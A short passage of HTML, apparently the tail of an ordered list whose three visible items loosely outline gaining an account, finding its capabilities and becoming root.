<li>Become one.</li>
<li>Find what it can do.</li>
<li>Become root.</li>
</ol>
